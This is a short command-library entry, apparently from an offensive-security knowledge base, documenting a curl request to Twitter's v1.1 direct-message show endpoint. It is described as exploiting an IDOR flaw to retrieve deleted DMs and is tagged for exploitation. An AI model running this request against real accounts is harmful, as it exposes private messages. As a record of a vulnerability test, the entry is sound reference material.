---
id: 123e4567-e89b-12d3-a456-426614174003
name: twitter-dm-show-retrieve-deleted
type: command
executor: bash
data: >-
  curl -X GET
  "https://api.twitter.com/1.1/direct_messages/show.json?id=578631102144741376"
  -H "Authorization: Bearer YOUR_API_TOKEN"
output: null
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.690Z'
platforms:
  - Web
  - API
tags:
  - api
  - twitter
  - idor
  - exploitation
verified: false
validated: true
submitted: true
---

# twitter-dm-show-retrieve-deleted

## Command

```bash
curl -X GET "https://api.twitter.com/1.1/direct_messages/show.json?id=578631102144741376" -H "Authorization: Bearer YOUR_API_TOKEN"
```

## Description

Specific instance of the Twitter DM show API call used post-deletion to exploit IDOR, demonstrating retrieval of deleted message content.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `id` | Fixed DM ID from test (578631102144741376) | Yes |
| `Authorization` | Bearer token for API auth | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.twitter.com/1.1/direct_messages/show.json?id=578631102144741376" -H "Authorization: Bearer YOUR_TOKEN"
```

### Advanced Usage

Not applicable; this is a targeted example.

## Expected Output

JSON with deleted DM: {"id": "578631102144741376", "text": "Deleted message text", ...}, confirming vuln.

## Related

- [[commands/twitter-dm-show-retrieve]]
- [[procedures/Exploit-IDOR-in-Twitter-DM-API]]
